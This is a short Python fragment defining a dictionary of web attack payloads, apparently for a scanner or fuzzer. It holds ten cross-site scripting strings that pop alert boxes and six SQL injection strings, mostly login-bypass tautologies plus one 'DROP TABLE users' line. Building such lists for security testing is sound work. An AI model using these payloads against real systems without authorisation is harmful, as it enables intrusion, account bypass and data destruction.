PAYLOADS = {
    'xss': [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert('XSS')>",
        "'\"><script>alert('XSS')</script>",
        "<iframe src=javascript:alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>",
        "<details open ontoggle=alert('XSS')>",
        "<video><source onerror=alert('XSS')>",
        "<a href=javascript:alert('XSS')>click</a>"
    ],
    'sqli': [
        "' OR 1=1 -- ",
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "\" OR \"\"=\"",
        "' OR 1=1#",
        "' OR 1=1/*",
    ]
}